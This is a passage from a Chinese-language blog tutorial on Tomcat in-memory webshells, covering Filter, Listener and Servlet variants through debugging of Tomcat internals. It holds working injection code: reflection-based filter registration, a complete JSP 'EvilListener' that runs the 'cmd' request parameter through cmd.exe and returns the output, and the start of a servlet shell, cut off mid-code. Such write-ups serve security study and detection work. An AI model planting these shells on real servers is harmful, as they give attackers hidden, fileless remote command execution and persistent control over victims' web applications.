filterConfigsField.get(standardContext);</span><br></pre></td></tr></table></figure><p>先是获取当前的servlet上下文并拿到其私有字段context，然后设置可访问，这样就可以通过反射这个context字段的值，这个值是一个ApplicationContext对象；接着获取ApplicationContext的私有字段context并设置可访问，然后通过反射获取ApplicationContext的context字段的值，这个值是一个StandardContext对象；最后是获取StandardContext的私有字段filterConfigs，设置可访问之后通过反射获取StandardContext的filterConfigs字段的值。</p><p>然后是这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(filterName);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(filterName);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">filterConfigs.put(filterName, applicationFilterConfig);</span><br></pre></td></tr></table></figure><p>也就是定义我们自己的filterDef和FilterMap并加入到srandardContext中，接着反射获取 ApplicationFilterConfig 类的构造函数并将构造函数设置为可访问，然后创建了一个 ApplicationFilterConfig 对象的实例，接着将刚刚创建的实例添加到过滤器配置的 Map 中，filterName 为键，这样就可以将动态创建的过滤器配置信息加入应用程序的全局配置中。</p><p>需要注意的是，在tomcat 7及以前FilterDef和FilterMap这两个类所属的包名是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><p>tomcat 8及以后，包名是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><p>由于这方面的区别，最好是直接都用反射去写这个filter内存马，具体demo参考：</p><p><a href="https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java">https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java</a></p><p>还有个需要注意的点就是，我给出的这个demo代码只适用于tomcat 7及以上，因为 filterMap.setDispatcher(<a href="http://DispatcherType.REQUEST.name">DispatcherType.REQUEST.name</a>());这行代码中用到的DispatcherType是在Servlet 3.0规范中才有的。</p><p>通用内存马文章参考：</p><p><a href="https://xz.aliyun.com/t/9914">https://xz.aliyun.com/t/9914</a></p><p><a href="https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ">https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ</a></p><p><a href="https://www.cnblogs.com/CoLo/p/16840371.html">https://www.cnblogs.com/CoLo/p/16840371.html</a></p><p><a href="https://flowerwind.github.io/2021/10/11/tomcat6">https://flowerwind.github.io/2021/10/11/tomcat6</a>、7、8、9内存马/</p><p><a href="https://9bie.org/index.php/archives/960/">https://9bie.org/index.php/archives/960/</a></p><p><a href="https://github.com/xiaopan233/GenerateNoHard">https://github.com/xiaopan233/GenerateNoHard</a></p><p><a href="https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell">https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell</a></p><h3 id="2-2Listener-内存马">2.2Listener 内存马</h3><h4 id="2-2-1-什么是-Listener？">2.2.1 什么是 Listener？</h4><p>Listener 是 Java Servlet 规范中的一部分，它提供了一种机制，使开发者能够编写监听器类来监听容器事件，并在事件发生时执行相应的逻辑。这样的机制使得我们能够在不修改源代码的情况下，通过监听器对现有应用程序进行扩展或增强。</p><h4 id="2-2-2-Listener-类型">2.2.2 Listener 类型</h4><p>Java 提供了几种类型的 Listener，其中最常见的有以下三种：</p><ul><li><strong>ServletContextListener（上下文监听器）</strong>：用于监听 Web 应用程序的启动和关闭事件。</li><li><strong>HttpSessionListener（会话监听器）</strong>：用于监听会话的创建和销毁事件。</li><li><strong>ServletRequestListener（请求监听器）</strong>：用于监听请求的创建和销毁事件。</li></ul><h4 id="2-2-3编写一个demo来学习">2.2.3编写一个demo来学习</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebListener(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">listenerdemo</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        ServletRequestListener.<span class="built_in">super</span>.requestDestroyed(sre);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        ServletRequestListener.<span class="built_in">super</span>.requestInitialized(sre);</span><br><span class="line">        System.out.println(<span class="string">&quot;chufa  listener !!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>web.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--listener 注册--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.example.tomcat_demo_neicunma.filterdemo<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p>启动起来会触发，每一次请求都会触发</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716104151402-8fb5e5f2-cadc-4b70-9801-51b1c1b8d87e.png" alt=""></p><h4 id="2-2-4调试分析">2.2.4调试分析</h4><p>还是像前面分析的一样，看listener是如何调用执行的</p><p>这里参考在调用到listenerstart方法之前的跟踪和调用</p><p><a href="https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716105178459-4f416b76-0e6e-49d6-903b-669fef4817d0.png" alt=""></p><p>在ContexConfig这个类的configureContext方法里的addApplicationListener加载了web.xml文件中的listener配置读取完配置文件之后standarcontext回去调用listenerStart方法</p><p>开始打下断点然后进行调试</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716104469192-8054c239-d1d1-4c38-8b72-7efe4ff910db.png" alt=""></p><p>我们直接找到listenerStart方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109108992-fdb1afc5-8bad-4a14-86a4-ac60415792b7.png" alt=""></p><p>可以看到该方法的第一行意思其实就是获取已经加载的listener也就web.xml中配置的监听器，接着往下看他对监听器做了一些分类有事件监听器和声明周期监听器等。紧接着我们看下面一段代码</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109216065-90a643e9-d000-4e47-9013-db18dc7671b8.png" alt=""></p><p>红框中圈出来的这段代码就是在遍历getApplicationEventListeners()获取applicationEventListenersList中的值，然后再设置applicationEventListenersList，可以理解为applicationEventListenersList加上刚刚实例化的eventListeners:<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109329399-55c17b08-0fed-4c30-abc3-c702ae669db6.png" alt=""></p><p>这是getApplicationEventListeners方法的内容就是将applicationEventsListener转换成包含任意类型的对象数组。那这总结起来就一句话，就是Listener有两个来源，一是根据web.xml文件或者@WebListener注解实例化得到的Listener；二是applicationEventListenersList中的Listener。前面的我们肯定没法控制，因为这是给开发者用的，不是给黑客用的哈哈哈。那就找找看，有没有类似之前我们用到的addFilterConfig这种函数呢？当然是有的，<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109567639-27d5f88f-83a7-40d5-a775-f4addcd1d8df.png" alt=""></p><p>可以看到是有的。所以就可以通过获取standardcontext对象添加我们自定义的监听器</p><p>我们继续向后跟在调用到我们自己的监听器时发现是由<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109893759-55866782-6b6c-4ed2-8fc2-fba462e12ab7.png" alt="">fireRequestinitEvent方法触发的跟进这个方法看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109992407-ffa0c485-24f8-40c7-acef-846ab4a6415f.png" alt=""></p><p>发现其会调用getApplicationEventListeners()并调用其中所有的ServletRequestListener.requestInitialized()</p><p>来总结一下：</p><p>Listener来源于tomcat初始化时从web.xml实例化的Listener和applicationEventListenersList中的Listener，前者我们无法控制，但是后者我们可以控制，只需要往applicationEventListenersList中加入我们的恶意Listener即可。实际上StandardContext存在addApplicationEventListener()方法可以直接给我们调用，往applicationEventListenersList中加入Listener。</p><p>所以我们的Listener内存马实现步骤:</p><ul><li><p>继承并编写一个恶意Listener</p></li><li><p>获取StandardContext</p></li><li><p>调用StandardContext.addApplicationEventListener()添加恶意Listener</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();</span><br><span class="line">    context.addApplicationEventListener(evilListener);</span><br><span class="line">    out.println(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Inject Listener Memory Shell successfully!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Shell url: http://localhost:8080/test/?cmd=ipconfig&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>关键代码分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"><span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();</span><br><span class="line">context.addApplicationEventListener(evilListener);</span><br></pre></td></tr></table></figure><p>前面四行代码干一件事：获取StandardContext；后两行干代码干这两件事：实例化我们编写的恶意Listener，调用addApplicationEventListener方法加入到applicationEventListenersList中去，这样最终就会到eventListener。</p><p>参考：<a href="http://wjlshare.com/archives/1651">http://wjlshare.com/archives/1651</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/</a></p><p><a href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#331-%E7%AE%80%E5%8D%95%E7%9A%84listener%E5%86%85%E5%AD%98%E9%A9%ACdemo%E7%BC%96%E5%86%99">https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#331-%E7%AE%80%E5%8D%95%E7%9A%84listener%E5%86%85%E5%AD%98%E9%A9%ACdemo%E7%BC%96%E5%86%99</a></p><h3 id="2-3servlet内存马">2.3servlet内存马</h3><h4 id="2-3-1什么是servlet">2.3.1什么是servlet</h4><p>先梳理下servlet的概念吧，在前置基础中也有介绍到，这里就简单叙述一下</p><p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p><p>使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p><p>Java Servlet 通常情况下与使用 CGI（Common Gateway Interface，公共网关接口）实现的程序可以达到异曲同工的效果，来浅看一下Servlet的架构图。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716302501974-ad72f07b-6755-48dd-9752-110cf116345f.png" alt=""></p><h4 id="2-3-2编写一个demo">2.3.2编写一个demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;testservlet&quot;, value = &quot;/testdemo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">servletdemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + <span class="string">&quot;hello world&quot;</span> + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web.xml配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--servlet 注册--&gt;</span><br><span class="line"> &lt;servlet&gt;</span><br><span class="line">     &lt;servlet-name&gt;testdemo&lt;/servlet-name&gt;</span><br><span class="line">     &lt;servlet-class&gt;com.example.tomcat_demo_neicunma.servletdemo&lt;/servlet-class&gt;</span><br><span class="line"> &lt;/servlet&gt;</span><br><span class="line"> &lt;servlet-mapping&gt;</span><br><span class="line">     &lt;servlet-name&gt;testdemo&lt;/servlet-name&gt;</span><br><span class="line">     &lt;url-pattern&gt;/testdemo&lt;/url-pattern&gt;</span><br><span class="line"> &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>访问对应的路径会回显页面</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303440097-2a9ebd08-b7d5-49b7-8fe5-c80405d4ee76.png" alt=""></p><h4 id="2-3-3-调试过程">2.3.3 调试过程</h4><p>像filter和listener一样调试一下他的加载过程</p><p>这里参考<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/</a>文章</p><p>我们知道 tomcat 在初始化的时候会加载web.xml文件，而在listener分析中我们知道web.xml文件是在ContexConfig类中的configureContext方法里加载的，这里我们看看该方法具体和servlet有关的<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303726531-2ace81c0-3851-4379-80cb-f719aa4538e1.png" alt=""></p><p>可以看到在箭头所指的地方加载了web.xml文件中配置的servlet的一些信息。然后就创建了一个Wrapper对象</p><p>然后就设置一些wrapper的属性。需要留意的一个特殊属性是load-on-startup属性，它是一个启动优先级。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303919959-daaadfba-a971-4736-a6b3-f4260c1259bd.png" alt=""></p><p>设置完之后会将wrapper加入到standardcontex的child里。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716307433202-ceef5573-912b-4fb0-8020-f69488333d37.png" alt=""></p><p>然后下面会遍历web.xml文件中servlet-mapping的servlet-name和对应的url-pattern，调用StandardContext.addServletMappingDecoded()添加servlet对应的映射</p><p>总结一下，Servlet的初始化一共有几个步骤:</p><ol><li>通过 context.createWapper() 创建 Wapper 对象</li><li>设置 Servlet 的 LoadOnStartUp 的值(后续分析为什么动态注册Servlet需要设置该属性)</li><li>设置 Servlet 的 Name</li><li>设置 Servlet 对应的 Class</li><li>将 Servlet 添加到 context 的 children 中</li><li>将 url 路径和 servlet 类做映射</li></ol><p>看一下servlet装载流程 在loadservlet下断点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308136617-ada7f674-47b8-42ed-b2e9-784c0d4bc9dc.png" alt=""></p><p>向上翻到standardcontex的startInternal()方法，可以看到，是在加载完Listener和Filter之后，才装载Servlet:</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308325585-77c98d66-1ef4-4a32-bc79-ac3a129867e1.png" alt=""></p><p>这里调用了findChildren()方法从StandardContext中拿到所有的child并传到loadOnStartUp()方法处理，跟到loadOnstartup()，可以根据代码和注释了解到这个方法会将所有load-on-startup属性大于0的wrapper加载(反之则不会)，这也是为什么上文我们提到需要关注这个属性的原因:</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308413491-730b5e2c-46e7-41e3-82a0-0a739a037d70.png" alt="">根据搜索，我们了解到load-on-startup属性的作用:</p><p>:::tips<br>load-on-startup 这个元素的含义是在服务器启动的时候就加载这个servlet(实例化并调用init()方法). 这个元素中的可选内容必须为一个整数,表明了这个servlet被加载的先后顺序. 当是一个负数时或者没有指定时，则表示服务器在该servlet被调用时才加载。</p><p>:::</p><p>可以看到当未设置load-on-startup属性是，tomcat采用的是一种懒加载的机制，只有servlet被调用时才会加载到Context中。由于我们需要动态注册Servlet，为了使其被加载，我们必须设置load-on-startup属性。</p><p>根据上述的流程分析，我们可以模仿上述的加载机制手动注册一个servlet:</p><ol><li>找到StandardContext</li><li>继承并编写一个恶意servlet</li><li>通过 context.createWapper() 创建 Wapper 对象</li><li>设置 Servlet 的 LoadOnStartUp 的值</li><li>设置 Servlet 的 Name</li><li>设置 Servlet 对应的 Class</li><li>将 Servlet 添加到 context 的 children 中</li><li>将 url 路径和 servlet 类做映射</li></ol><p>参考：<a href="https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><h4 id="2-3-4内存马编写">2.3.4内存马编写</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedInputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Sentiment&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">HttpServlet</span> <span class="variable">httpServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServlet</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span 